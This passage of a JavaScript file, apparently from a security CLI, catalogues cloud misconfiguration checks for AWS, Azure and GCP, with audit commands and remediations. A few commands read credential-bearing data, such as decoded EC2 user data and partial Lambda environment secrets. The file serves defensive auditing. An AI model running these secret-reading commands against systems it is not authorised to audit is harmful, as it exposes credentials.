"use strict";
// Cloud security testing reference — offline catalogue of checks, tools, payloads,
// and hardening recommendations for AWS, Azure, GCP, and container environments.
// Used by Darknode CLI to surface actionable cloud-security guidance without
// requiring network access. No real credentials or secrets are included anywhere.

// ---------------------------------------------------------------------------
// 1. AWS_CHECKS — 35 checks covering S3, IAM, EC2/IMDS, Lambda, CloudTrail,
//    GuardDuty, KMS, VPC security groups, RDS, EBS, and more.
// ---------------------------------------------------------------------------

const AWS_CHECKS = [
  // -- S3 Bucket Misconfiguration --
  {
    name: "s3-public-acl",
    description: "Detect S3 buckets with public ACLs that expose objects to the internet",
    command: "aws s3api get-bucket-acl --bucket BUCKET_NAME --query 'Grants[?Grantee.URI==`http://acs.amazonaws.com/groups/global/AllUsers`]'",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Remove public ACL grants and enable S3 Block Public Access at the account level: aws s3api put-public-access-block --bucket BUCKET_NAME --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
  },
  {
    name: "s3-bucket-policy-public",
    description: "Check if the bucket policy allows unauthenticated access via Principal '*'",
    command: "aws s3api get-bucket-policy --bucket BUCKET_NAME --query Policy --output text | python3 -c \"import sys,json; p=json.load(sys.stdin); [print(s) for s in p['Statement'] if s.get('Principal')=='*' or s.get('Principal',{}).get('AWS')=='*']\"",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Restrict the bucket policy Principal to specific AWS accounts or IAM roles. Never use Principal: '*' without a limiting Condition block."
  },
  {
    name: "s3-encryption-at-rest",
    description: "Verify that server-side encryption is enabled on all S3 buckets",
    command: "aws s3api get-bucket-encryption --bucket BUCKET_NAME",
    tool: "aws-cli",
    risk: "high",
    remediation: "Enable default encryption with SSE-S3 or SSE-KMS: aws s3api put-bucket-encryption --bucket BUCKET_NAME --server-side-encryption-configuration '{\"Rules\":[{\"ApplyServerSideEncryptionByDefault\":{\"SSEAlgorithm\":\"aws:kms\"}}]}'"
  },
  {
    name: "s3-versioning-disabled",
    description: "Detect S3 buckets without versioning, which prevents recovery from accidental deletes or overwrites",
    command: "aws s3api get-bucket-versioning --bucket BUCKET_NAME",
    tool: "aws-cli",
    risk: "medium",
    remediation: "Enable versioning: aws s3api put-bucket-versioning --bucket BUCKET_NAME --versioning-configuration Status=Enabled"
  },
  {
    name: "s3-logging-disabled",
    description: "Check whether server access logging is enabled for audit trail purposes",
    command: "aws s3api get-bucket-logging --bucket BUCKET_NAME",
    tool: "aws-cli",
    risk: "medium",
    remediation: "Enable access logging to a dedicated logging bucket: aws s3api put-bucket-logging --bucket BUCKET_NAME --bucket-logging-status '{\"LoggingEnabled\":{\"TargetBucket\":\"LOG_BUCKET\",\"TargetPrefix\":\"s3-logs/\"}}'"
  },

  // -- IAM Policy Analysis --
  {
    name: "iam-admin-star-policy",
    description: "Find IAM policies that grant Action: '*' on Resource: '*', effectively full admin access",
    command: "aws iam list-policies --only-attached --query 'Policies[*].Arn' --output text | tr '\\t' '\\n' | while read arn; do v=$(aws iam get-policy --policy-arn $arn --query 'Policy.DefaultVersionId' --output text); aws iam get-policy-version --policy-arn $arn --version-id $v --query 'PolicyVersion.Document' --output json | grep -l '\"Action\":\"\\*\"' && echo \"OVERPRIVILEGED: $arn\"; done",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Apply least-privilege by replacing wildcard actions with specific service actions. Use IAM Access Analyzer to identify unused permissions and scope them down."
  },
  {
    name: "iam-unused-credentials",
    description: "Detect IAM users with access keys not used in the last 90 days",
    command: "aws iam generate-credential-report && aws iam get-credential-report --query Content --output text | base64 -d | awk -F, '$5!=\"N/A\" && $5!=\"not_supported\" {split($5,d,\"T\"); if (systime()-mktime(gensub(/-/,\" \",\"g\",d[1])\" 0 0 0\")>7776000) print $1, $5}'",
    tool: "aws-cli",
    risk: "high",
    remediation: "Deactivate or delete unused access keys. Enforce key rotation with a maximum age of 90 days via an SCP or config rule."
  },
  {
    name: "iam-mfa-not-enabled",
    description: "Identify IAM users that do not have MFA enabled, especially those with console access",
    command: "aws iam list-users --query 'Users[*].UserName' --output text | tr '\\t' '\\n' | while read u; do mfa=$(aws iam list-mfa-devices --user-name $u --query 'MFADevices' --output text); [ -z \"$mfa\" ] && echo \"NO MFA: $u\"; done",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Enforce MFA for all IAM users via an IAM policy condition: aws:MultiFactorAuthPresent. Use hardware MFA tokens for root and privileged accounts."
  },
  {
    name: "iam-password-policy",
    description: "Check if the account password policy meets security baselines (length, complexity, rotation)",
    command: "aws iam get-account-password-policy",
    tool: "aws-cli",
    risk: "medium",
    remediation: "Set a strong password policy: aws iam update-account-password-policy --minimum-password-length 14 --require-symbols --require-numbers --require-uppercase-characters --require-lowercase-characters --max-password-age 90 --password-reuse-prevention 24"
  },
  {
    name: "iam-cross-account-roles",
    description: "Enumerate IAM roles that trust external AWS accounts, identifying potential lateral movement paths",
    command: "aws iam list-roles --query 'Roles[*].[RoleName,AssumeRolePolicyDocument]' --output json | python3 -c \"import sys,json; roles=json.load(sys.stdin); [print(r[0],s.get('Principal',{})) for r in roles for s in r[1].get('Statement',[]) if '\\\"AWS\\\"' in json.dumps(s.get('Principal',{})) and ':root' not in json.dumps(s.get('Principal',{}).get('AWS',''))]\"",
    tool: "aws-cli",
    risk: "high",
    remediation: "Audit all cross-account trust relationships. Add ExternalId conditions to prevent confused-deputy attacks. Remove trust to accounts no longer in use."
  },
  {
    name: "iam-root-access-keys",
    description: "Check whether the root account has active access keys, which is a critical security violation",
    command: "aws iam generate-credential-report && aws iam get-credential-report --query Content --output text | base64 -d | grep '<root_account>' | awk -F, '{print \"access_key_1_active:\"$9, \"access_key_2_active:\"$14}'",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Delete all root account access keys immediately. Use IAM users or roles for programmatic access. Enable MFA on the root account."
  },

  // -- EC2 / IMDS --
  {
    name: "ec2-imds-v1-enabled",
    description: "Detect EC2 instances that allow IMDSv1 (unauthenticated metadata access), enabling SSRF-based credential theft",
    command: "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,MetadataOptions.HttpTokens]' --output table | grep optional",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Enforce IMDSv2 (token-required): aws ec2 modify-instance-metadata-options --instance-id INSTANCE_ID --http-tokens required --http-endpoint enabled"
  },
  {
    name: "ec2-public-ip-instances",
    description: "List all EC2 instances with public IP addresses that may be directly exposed to the internet",
    command: "aws ec2 describe-instances --query 'Reservations[*].Instances[?PublicIpAddress!=null].[InstanceId,PublicIpAddress,State.Name]' --output table",
    tool: "aws-cli",
    risk: "medium",
    remediation: "Place instances behind a load balancer or NAT gateway. Remove direct public IP assignments unless explicitly required and protected by security groups."
  },
  {
    name: "ec2-security-group-open-all",
    description: "Find security groups with ingress rules allowing 0.0.0.0/0 on all ports",
    command: "aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`] && (FromPort==`0` || !FromPort)]].[GroupId,GroupName]' --output table",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Restrict security group rules to specific ports and source CIDR ranges. Use VPC endpoints for AWS service access instead of opening internet routes."
  },
  {
    name: "ec2-user-data-secrets",
    description: "Retrieve EC2 instance user data which may contain hardcoded credentials or secrets",
    command: "aws ec2 describe-instance-attribute --instance-id INSTANCE_ID --attribute userData --query UserData.Value --output text | base64 -d",
    tool: "aws-cli",
    risk: "high",
    remediation: "Never embed secrets in user data. Use AWS Secrets Manager, SSM Parameter Store, or instance profiles for credential delivery."
  },
  {
    name: "ec2-ebs-snapshot-public",
    description: "Detect EBS snapshots shared publicly, which may expose sensitive data to any AWS account",
    command: "aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[*].SnapshotId' --output text | tr '\\t' '\\n' | while read sid; do perm=$(aws ec2 describe-snapshot-attribute --snapshot-id $sid --attribute createVolumePermission --query 'CreateVolumePermissions[?Group==`all`]' --output text); [ -n \"$perm\" ] && echo \"PUBLIC: $sid\"; done",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Remove public sharing: aws ec2 modify-snapshot-attribute --snapshot-id SNAP_ID --attribute createVolumePermission --operation-type remove --group-names all"
  },

  // -- Lambda --
  {
    name: "lambda-public-access",
    description: "Check for Lambda functions with resource-based policies that grant public invocation access",
    command: "aws lambda list-functions --query 'Functions[*].FunctionName' --output text | tr '\\t' '\\n' | while read fn; do pol=$(aws lambda get-policy --function-name $fn 2>/dev/null); echo \"$pol\" | grep -q '\"Principal\":\"\\*\"' && echo \"PUBLIC: $fn\"; done",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Remove overly permissive resource policies. Restrict Principal to specific AWS accounts or services using Condition elements."
  },
  {
    name: "lambda-env-secrets",
    description: "Audit Lambda function environment variables for embedded secrets, API keys, or tokens",
    command: "aws lambda list-functions --query 'Functions[*].[FunctionName,Environment.Variables]' --output json | python3 -c \"import sys,json; fns=json.load(sys.stdin); [print(f[0],k,v[:8]+'...') for f in fns if f[1] for k,v in f[1].items() if any(s in k.upper() for s in ['KEY','SECRET','TOKEN','PASSWORD','CREDENTIALS'])]\"",
    tool: "aws-cli",
    risk: "high",
    remediation: "Store secrets in AWS Secrets Manager or SSM Parameter Store with encryption. Reference them at runtime rather than embedding in environment variables."
  },
  {
    name: "lambda-execution-role-overprivileged",
    description: "Identify Lambda execution roles with admin or wildcard permissions that violate least-privilege",
    command: "aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output text | while read fn role; do echo \"=== $fn ===\"; aws iam list-attached-role-policies --role-name $(echo $role | awk -F/ '{print $NF}') --query 'AttachedPolicies[*].PolicyArn' --output text; done",
    tool: "aws-cli",
    risk: "high",
    remediation: "Scope Lambda execution roles to only the AWS services and actions the function needs. Use SAM policy templates for common patterns."
  },

  // -- CloudTrail --
  {
    name: "cloudtrail-disabled",
    description: "Verify that CloudTrail is enabled in all regions for comprehensive API activity logging",
    command: "aws cloudtrail describe-trails --query 'trailList[*].[Name,IsMultiRegionTrail,IsLogging]' --output table",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Enable a multi-region trail with management and data events: aws cloudtrail create-trail --name org-trail --s3-bucket-name TRAIL_BUCKET --is-multi-region-trail --enable-log-file-validation && aws cloudtrail start-logging --name org-trail"
  },
  {
    name: "cloudtrail-log-validation",
    description: "Check that CloudTrail log file integrity validation is enabled to detect log tampering",
    command: "aws cloudtrail describe-trails --query 'trailList[*].[Name,LogFileValidationEnabled]' --output table",
    tool: "aws-cli",
    risk: "high",
    remediation: "Enable log file validation: aws cloudtrail update-trail --name TRAIL_NAME --enable-log-file-validation"
  },
  {
    name: "cloudtrail-s3-bucket-access",
    description: "Verify that the CloudTrail S3 bucket is not publicly accessible and has proper access controls",
    command: "trail_bucket=$(aws cloudtrail describe-trails --query 'trailList[0].S3BucketName' --output text); aws s3api get-bucket-acl --bucket $trail_bucket; aws s3api get-public-access-block --bucket $trail_bucket",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Enable S3 Block Public Access on the CloudTrail bucket. Restrict bucket policy to only the CloudTrail service principal."
  },

  // -- GuardDuty --
  {
    name: "guardduty-not-enabled",
    description: "Verify GuardDuty is enabled in all regions for threat detection of malicious activity",
    command: "for region in $(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text); do det=$(aws guardduty list-detectors --region $region --query 'DetectorIds[0]' --output text 2>/dev/null); [ \"$det\" = \"None\" ] && echo \"DISABLED: $region\"; done",
    tool: "aws-cli",
    risk: "high",
    remediation: "Enable GuardDuty in all regions. Use AWS Organizations delegated admin for centralized management."
  },

  // -- KMS --
  {
    name: "kms-key-rotation-disabled",
    description: "Identify KMS customer-managed keys that do not have automatic key rotation enabled",
    command: "aws kms list-keys --query 'Keys[*].KeyId' --output text | tr '\\t' '\\n' | while read kid; do rot=$(aws kms get-key-rotation-status --key-id $kid --query KeyRotationEnabled --output text 2>/dev/null); [ \"$rot\" = \"False\" ] && echo \"NO ROTATION: $kid\"; done",
    tool: "aws-cli",
    risk: "medium",
    remediation: "Enable automatic key rotation: aws kms enable-key-rotation --key-id KEY_ID"
  },
  {
    name: "kms-key-policy-public",
    description: "Detect KMS keys with policies that grant access to all AWS principals",
    command: "aws kms list-keys --query 'Keys[*].KeyId' --output text | tr '\\t' '\\n' | while read kid; do aws kms get-key-policy --key-id $kid --policy-name default --output text | grep -q '\"Principal\":\"\\*\"' && echo \"PUBLIC KEY POLICY: $kid\"; done",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Restrict KMS key policies to specific IAM principals and AWS accounts. Never use Principal: '*' without conditions."
  },

  // -- VPC Security Groups --
  {
    name: "vpc-default-security-group-in-use",
    description: "Check if the default security group is associated with resources, which often has overly permissive rules",
    command: "aws ec2 describe-security-groups --filters Name=group-name,Values=default --query 'SecurityGroups[?IpPermissions[0]].[GroupId,VpcId]' --output table",
    tool: "aws-cli",
    risk: "medium",
    remediation: "Remove all inbound and outbound rules from default security groups. Create purpose-built groups with explicit least-privilege rules."
  },
  {
    name: "vpc-flow-logs-disabled",
    description: "Identify VPCs without flow logs enabled, preventing network traffic analysis and forensics",
    command: "aws ec2 describe-vpcs --query 'Vpcs[*].VpcId' --output text | tr '\\t' '\\n' | while read vid; do fl=$(aws ec2 describe-flow-logs --filter Name=resource-id,Values=$vid --query 'FlowLogs[0].FlowLogId' --output text); [ \"$fl\" = \"None\" ] && echo \"NO FLOW LOGS: $vid\"; done",
    tool: "aws-cli",
    risk: "high",
    remediation: "Enable VPC flow logs to CloudWatch or S3: aws ec2 create-flow-logs --resource-ids VPC_ID --resource-type VPC --traffic-type ALL --log-destination-type cloud-watch-logs --log-group-name vpc-flow-logs"
  },
  {
    name: "vpc-ssh-open-to-world",
    description: "Find security groups allowing SSH (port 22) from 0.0.0.0/0",
    command: "aws ec2 describe-security-groups --filters Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0 --query 'SecurityGroups[*].[GroupId,GroupName]' --output table",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Restrict SSH access to specific IP ranges or use AWS Systems Manager Session Manager for shell access without opening port 22."
  },
  {
    name: "vpc-rdp-open-to-world",
    description: "Find security groups allowing RDP (port 3389) from 0.0.0.0/0",
    command: "aws ec2 describe-security-groups --filters Name=ip-permission.from-port,Values=3389 Name=ip-permission.to-port,Values=3389 Name=ip-permission.cidr,Values=0.0.0.0/0 --query 'SecurityGroups[*].[GroupId,GroupName]' --output table",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Restrict RDP access to VPN or bastion host IP ranges only. Consider AWS Systems Manager Fleet Manager for remote desktop access."
  },

  // -- RDS --
  {
    name: "rds-public-access",
    description: "Detect RDS instances with PubliclyAccessible enabled, exposing databases to the internet",
    command: "aws rds describe-db-instances --query 'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier,Engine,Endpoint.Address]' --output table",
    tool: "aws-cli",
    risk: "critical",
    remediation: "Disable public access: aws rds modify-db-instance --db-instance-identifier INSTANCE_ID --no-publicly-accessible. Place databases in private subnets."
  },
  {
    name: "rds-encryption-disabled",
    description: "Identify RDS instances without storage encryption enabled",
    command: "aws rds describe-db-instances --query 'DBInstances[?StorageEncrypted==`false`].[DBInstanceIdentifier,Engine]' --output table",
    tool: "aws-cli",
    risk: "high",
    remediation: "Enable encryption by creating an encrypted snapshot and restoring from it. New instances should always be created with --storage-encrypted."
  },
  {
    name: "rds-automated-backups-disabled",
    description: "Find RDS instances with automated backups disabled (retention period of 0)",
    command: "aws rds describe-db-instances --query 'DBInstances[?BackupRetentionPeriod==`0`].[DBInstanceIdentifier,Engine]' --output table",
    tool: "aws-cli",
    risk: "medium",
    remediation: "Enable automated backups with adequate retention: aws rds modify-db-instance --db-instance-identifier INSTANCE_ID --backup-retention-period 7"
  },

  // -- EBS Encryption --
  {
    name: "ebs-encryption-default-disabled",
    description: "Check if EBS encryption by default is disabled in the region, leaving new volumes unencrypted",
    command: "aws ec2 get-ebs-encryption-by-default --query EbsEncryptionByDefault --output text",
    tool: "aws-cli",
    risk: "high",
    remediation: "Enable EBS encryption by default: aws ec2 enable-ebs-encryption-by-default"
  },
  {
    name: "ebs-unencrypted-volumes",
    description: "List all unencrypted EBS volumes in the account",
    command: "aws ec2 describe-volumes --filters Name=encrypted,Values=false --query 'Volumes[*].[VolumeId,State,Size,AvailabilityZone]' --output table",
    tool: "aws-cli",
    risk: "high",
    remediation: "Create encrypted copies of unencrypted volumes using snapshots. Enable EBS encryption by default to prevent future unencrypted volumes."
  },

  // -- Additional AWS Checks --
  {
    name: "aws-config-not-enabled",
    description: "Verify AWS Config is recording resource configurations for compliance and drift detection",
    command: "aws configservice describe-configuration-recorders --query 'ConfigurationRecorders[*].[name,recordingGroup.allSupported]' --output table",
    tool: "aws-cli",
    risk: "high",
    remediation: "Enable AWS Config with all resource types: aws configservice put-configuration-recorder --configuration-recorder name=default,roleARN=CONFIG_ROLE_ARN,recordingGroup={allSupported=true}"
  },
  {
    name: "aws-secrets-manager-rotation",
    description: "Identify secrets in AWS Secrets Manager that do not have automatic rotation configured",
    command: "aws secretsmanager list-secrets --query 'SecretList[?!RotationEnabled].[Name,LastChangedDate]' --output table",
    tool: "aws-cli",
    risk: "medium",
    remediation: "Enable automatic rotation with a Lambda rotation function: aws secretsmanager rotate-secret --secret-id SECRET_NAME --rotation-lambda-arn LAMBDA_ARN --rotation-rules AutomaticallyAfterDays=30"
  }
];

// ---------------------------------------------------------------------------
// 2. AZURE_CHECKS — 25 checks for storage, RBAC, Key Vault, NSG, AD,
//    App Services, and more.
// ---------------------------------------------------------------------------

const AZURE_CHECKS = [
  // -- Storage Accounts --
  {
    name: "azure-storage-public-access",
    description: "Detect Azure storage accounts that allow public blob access, potentially exposing sensitive data",
    command: "az storage account list --query '[?allowBlobPublicAccess==`true`].[name,resourceGroup]' -o table",
    tool: "az-cli",
    risk: "critical"
  },
  {
    name: "azure-storage-https-only",
    description: "Find storage accounts that do not enforce HTTPS-only transport",
    command: "az storage account list --query '[?enableHttpsTrafficOnly==`false`].[name,resourceGroup]' -o table",
    tool: "az-cli",
    risk: "high"
  },
  {
    name: "azure-storage-encryption",
    description: "Verify that storage account encryption is enabled with customer-managed keys where required",
    command: "az storage account list --query '[*].[name,encryption.keySource]' -o table",
    tool: "az-cli",
    risk: "medium"
  },
  {
    name: "azure-storage-network-rules",
    description: "Identify storage accounts with default network access set to Allow (no firewall restrictions)",
    command: "az storage account list --query '[?networkRuleSet.defaultAction==`Allow`].[name,resourceGroup]' -o table",
    tool: "az-cli",
    risk: "high"
  },
  {
    name: "azure-storage-soft-delete",
    description: "Check if blob soft delete is enabled for recovery from accidental deletions",
    command: "az storage account list --query '[*].name' -o tsv | while read acct; do sd=$(az storage blob service-properties delete-policy show --account-name $acct --query enabled -o tsv 2>/dev/null); [ \"$sd\" != \"true\" ] && echo \"NO SOFT DELETE: $acct\"; done",
    tool: "az-cli",
    risk: "medium"
  },

  // -- RBAC --
  {
    name: "azure-rbac-owner-count",
    description: "Audit the number of users with Owner role at subscription level to minimize blast radius",
    command: "az role assignment list --role Owner --scope /subscriptions/SUBSCRIPTION_ID --query '[*].[principalName,principalType]' -o table",
    tool: "az-cli",
    risk: "high"
  },
  {
    name: "azure-rbac-custom-roles",
    description: "List custom RBAC roles that may have overly permissive action definitions",
    command: "az role definition list --custom-role-only true --query '[*].[roleName,permissions[0].actions]' -o json",
    tool: "az-cli",
    risk: "medium"
  },
  {
    name: "azure-rbac-classic-admins",
    description: "Identify classic subscription administrators (co-admins) which bypass RBAC controls",
    command: "az role assignment list --include-classic-administrators --query '[?roleDefinitionName==`CoAdministrator`].[principalName]' -o table",
    tool: "az-cli",
    risk: "high"
  },
  {
    name: "azure-rbac-guest-users",
    description: "Detect guest users with elevated RBAC role assignments that may pose insider risk",
    command: "az role assignment list --all --query '[?principalType==`ForeignGroup` || contains(principalName, `#EXT#`)].[principalName,roleDefinitionName,scope]' -o table",
    tool: "az-cli",
    risk: "medium"
  },

  // -- Key Vaults --
  {
    name: "azure-keyvault-soft-delete",
    description: "Find Key Vaults without soft delete enabled, risking permanent loss of keys and secrets",
    command: "az keyvault list --query '[?properties.enableSoftDelete!=`true`].[name,resourceGroup]' -o table",
    tool: "az-cli",
    risk: "high"
  },
  {
    name: "azure-keyvault-purge-protection",
    description: "Identify Key Vaults without purge protection, allowing permanent deletion during soft-delete period",
    command: "az keyvault list --query '[?properties.enablePurgeProtection!=`true`].[name,resourceGroup]' -o table",
    tool: "az-cli",
    risk: "high"
  },
  {
    name: "azure-keyvault-network-acls",
    description: "Detect Key Vaults accessible from all networks without firewall restrictions",
    command: "az keyvault list --query '[*].name' -o tsv | while read kv; do acl=$(az keyvault show --name $kv --query 'properties.networkAcls.defaultAction' -o tsv 2>/dev/null); [ \"$acl\" = \"Allow\" ] && echo \"OPEN NETWORK: $kv\"; done",
    tool: "az-cli",
    risk: "high"
  },
  {
    name: "azure-keyvault-expiring-secrets",
    description: "Find secrets in Key Vault that are expired or expiring within 30 days",
    command: "az keyvault secret list --vault-name VAULT_NAME --query '[?attributes.expires && attributes.expires<=`FUTURE_DATE`].[id,attributes.expires]' -o table",
    tool: "az-cli",
    risk: "medium"
  },

  // -- NSG Rules --
  {
    name: "azure-nsg-allow-all-inbound",
    description: "Detect NSG rules that allow all inbound traffic from any source, bypassing network segmentation",
    command: "az network nsg list --query '[*].name' -o tsv | while read nsg; do az network nsg rule list --nsg-name $nsg --resource-group RG_NAME --query '[?sourceAddressPrefix==`*` && access==`Allow` && direction==`Inbound`].[name,destinationPortRange]' -o table; done",
    tool: "az-cli",
    risk: "critical"
  },
  {
    name: "azure-nsg-ssh-open",
    description: "Find NSG rules allowing SSH (port 22) from the internet",
    command: "az network nsg list --query '[*].[name,resourceGroup]' -o tsv | while read nsg rg; do az network nsg rule list --nsg-name $nsg --resource-group $rg --query '[?destinationPortRange==`22` && sourceAddressPrefix==`*` && access==`Allow`].[name]' -o tsv | while read r; do echo \"OPEN SSH: $nsg/$r\"; done; done",
    tool: "az-cli",
    risk: "critical"
  },
  {
    name: "azure-nsg-rdp-open",
    description: "Find NSG rules allowing RDP (port 3389) from the internet",
    command: "az network nsg rule list --nsg-name NSG_NAME --resource-group RG_NAME --query '[?destinationPortRange==`3389` && sourceAddressPrefix==`*` && access==`Allow`]' -o table",
    tool: "az-cli",
    risk: "critical"
  },

  // -- Azure AD --
  {
    name: "azure-ad-mfa-status",
    description: "Audit Azure AD users for MFA registration and enforcement status",
    command: "az ad user list --query '[*].[displayName,userPrincipalName,accountEnabled]' -o table",
    tool: "az-cli / MS Graph",
    risk: "critical"
  },
  {
    name: "azure-ad-stale-apps",
    description: "Identify Azure AD app registrations with credentials that have not been rotated in over 180 days",
    command: "az ad app list --query '[*].[displayName,appId,passwordCredentials[0].endDateTime]' -o table",
    tool: "az-cli",
    risk: "medium"
  },
  {
    name: "azure-ad-privileged-roles",
    description: "List users assigned to Global Administrator and other highly privileged directory roles",
    command: "az rest --method GET --url 'https://graph.microsoft.com/v1.0/directoryRoles' --query 'value[?displayName==`Global Administrator`].{id:id}' -o json | python3 -c \"import sys,json; roles=json.load(sys.stdin); [print(r['id']) for r in roles]\" | while read rid; do az rest --method GET --url \"https://graph.microsoft.com/v1.0/directoryRoles/$rid/members\" --query 'value[*].userPrincipalName' -o tsv; done",
    tool: "az-cli / MS Graph",
    risk: "critical"
  },
  {
    name: "azure-ad-conditional-access",
    description: "Verify that conditional access policies enforce MFA for risky sign-ins and privileged actions",
    command: "az rest --method GET --url 'https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies' --query 'value[*].[displayName,state,conditions.signInRiskLevels]' -o json",
    tool: "az-cli / MS Graph",
    risk: "high"
  },

  // -- App Services --
  {
    name: "azure-appservice-https-only",
    description: "Find App Services that do not enforce HTTPS, allowing unencrypted client connections",
    command: "az webapp list --query '[?httpsOnly==`false`].[name,resourceGroup]' -o table",
    tool: "az-cli",
    risk: "high"
  },
  {
    name: "azure-appservice-tls-version",
    description: "Identify App Services using outdated TLS versions (below 1.2)",
    command: "az webapp list --query '[*].name' -o tsv | while read app; do ver=$(az webapp config show --name $app --resource-group RG_NAME --query minTlsVersion -o tsv 2>/dev/null); [ \"$ver\" != \"1.2\" ] && [ \"$ver\" != \"1.3\" ] && echo \"OLD TLS: $app ($ver)\"; done",
    tool: "az-cli",
    risk: "high"
  },
  {
    name: "azure-appservice-auth",
    description: "Check if App Service authentication (EasyAuth) is disabled, relying solely on application-level auth",
    command: "az webapp auth show --name APP_NAME --resource-group RG_NAME --query enabled -o tsv",
    tool: "az-cli",
    risk: "medium"
  },
  {
    name: "azure-appservice-managed-identity",
    description: "Identify App Services not using managed identities, relying on stored credentials instead",
    command: "az webapp list --query '[?identity==null].[name,resourceGroup]' -o table",
    tool: "az-cli",
    risk: "medium"
  },
  {
    name: "azure-sql-tde-disabled",
    description: "Detect Azure SQL databases without Transparent Data Encryption enabled",
    command: "az sql db tde show --server SERVER_NAME --database DB_NAME --resource-group RG_NAME --query status -o tsv",
    tool: "az-cli",
    risk: "high"
  }
];

// ---------------------------------------------------------------------------
// 3. GCP_CHECKS — 20 checks for Compute, IAM, Storage, GKE, and more.
// ---------------------------------------------------------------------------

const GCP_CHECKS = [
  // -- IAM --
  {
    name: "gcp-iam-primitive-roles",
    description: "Detect use of primitive roles (Owner, Editor, Viewer) which are overly broad for production workloads",
    command: "gcloud projects get-iam-policy PROJECT_ID --flatten='bindings[].members' --filter='bindings.role:(roles/owner OR roles/editor)' --format='table(bindings.role,bindings.members)'",
    tool: "gcloud",
    risk: "high"
  },
  {
    name: "gcp-iam-service-account-keys",
    description: "List service accounts with user-managed keys, which pose credential leakage risk",
    command: "gcloud iam service-accounts list --project PROJECT_ID --format='value(email)' | while read sa; do keys=$(gcloud iam service-accounts keys list --iam-account $sa --managed-by user --format='value(name)'); [ -n \"$keys\" ] && echo \"USER KEYS: $sa\"; done",
    tool: "gcloud",
    risk: "high"
  },
  {
    name: "gcp-iam-sa-impersonation",
    description: "Identify principals that can impersonate service accounts, enabling privilege escalation",
    command: "gcloud iam service-accounts list --project PROJECT_ID --format='value(email)' | while read sa; do gcloud iam service-accounts get-iam-policy $sa --format=json | python3 -c \"import sys,json; p=json.load(sys.stdin); [print('$sa',b['role'],m) for b in p.get('bindings',[]) for m in b['members'] if 'iam.serviceAccountTokenCreator' in b['role'] or 'iam.serviceAccountUser' in b['role']]\"; done",
    tool: "gcloud",
    risk: "critical"
  },
  {
    name: "gcp-iam-domain-restricted-sharing",
    description: "Check if the organization policy restricts IAM policy sharing to approved domains only",
    command: "gcloud resource-manager org-policies describe constraints/iam.allowedPolicyMemberDomains --project PROJECT_ID --format=json",
    tool: "gcloud",
    risk: "high"
  },

  // -- Compute --
  {
    name: "gcp-compute-public-ip",
    description: "List Compute Engine instances with external IP addresses directly exposed to the internet",
    command: "gcloud compute instances list --project PROJECT_ID --format='table(name,zone,networkInterfaces[0].accessConfigs[0].natIP)' --filter='networkInterfaces[0].accessConfigs[0].natIP:*'",
    tool: "gcloud",
    risk: "medium"
  },
  {
    name: "gcp-compute-default-sa",
    description: "Detect instances running with the default Compute Engine service account and full API scopes",
    command: "gcloud compute instances list --project PROJECT_ID --format=json | python3 -c \"import sys,json; insts=json.load(sys.stdin); [print(i['name'],sa['email'],sa['scopes']) for i in insts for sa in i.get('serviceAccounts',[]) if 'compute@developer.gserviceaccount.com' in sa['email']]\"",
    tool: "gcloud",
    risk: "high"
  },
  {
    name: "gcp-compute-serial-port",
    description: "Find instances with serial port access enabled, which can be used for unauthorized console access",
    command: "gcloud compute instances list --project PROJECT_ID --format='value(name,zone)' | while read name zone; do sp=$(gcloud compute instances describe $name --zone $zone --format='value(metadata.items[key=serial-port-enable].value)' 2>/dev/null); [ \"$sp\" = \"true\" ] && echo \"SERIAL PORT ENABLED: $name\"; done",
    tool: "gcloud",
    risk: "medium"
  },
  {
    name: "gcp-compute-shielded-vm",
    description: "Identify instances not using Shielded VM features (secure boot, vTPM, integrity monitoring)",
    command: "gcloud compute instances list --project PROJECT_ID --format='table(name,shieldedInstanceConfig.enableSecureBoot,shieldedInstanceConfig.enableVtpm,shieldedInstanceConfig.enableIntegrityMonitoring)' --filter='shieldedInstanceConfig.enableSecureBoot!=true'",
    tool: "gcloud",
    risk: "medium"
  },
  {
    name: "gcp-firewall-open-all",
    description: "Detect firewall rules that allow all traffic from 0.0.0.0/0 on all ports",
    command: "gcloud compute firewall-rules list --project PROJECT_ID --format='table(name,sourceRanges,allowed)' --filter='sourceRanges:(0.0.0.0/0) AND allowed.ports:(*) AND direction=INGRESS'",
    tool: "gcloud",
    risk: "critical"
  },
  {
    name: "gcp-firewall-ssh-open",
    description: "Find firewall rules allowing SSH from the internet (0.0.0.0/0 on port 22)",
    command: "gcloud compute firewall-rules list --project PROJECT_ID --format='table(name,sourceRanges,allowed)' --filter='sourceRanges:(0.0.0.0/0) AND allowed[].ports:(22) AND direction=INGRESS'",
    tool: "gcloud",
    risk: "critical"
  },

  // -- Storage --
  {
    name: "gcp-storage-public-buckets",
    description: "Detect Cloud Storage buckets with allUsers or allAuthenticatedUsers ACL entries",
    command: "gsutil ls -p PROJECT_ID | while read bucket; do acl=$(gsutil iam get $bucket 2>/dev/null); echo \"$acl\" | grep -qE 'allUsers|allAuthenticatedUsers' && echo \"PUBLIC: $bucket\"; done",
    tool: "gsutil",
    risk: "critical"
  },
  {
    name: "gcp-storage-uniform-access",
    description: "Identify buckets not using uniform bucket-level access, allowing legacy ACL-based permissions",
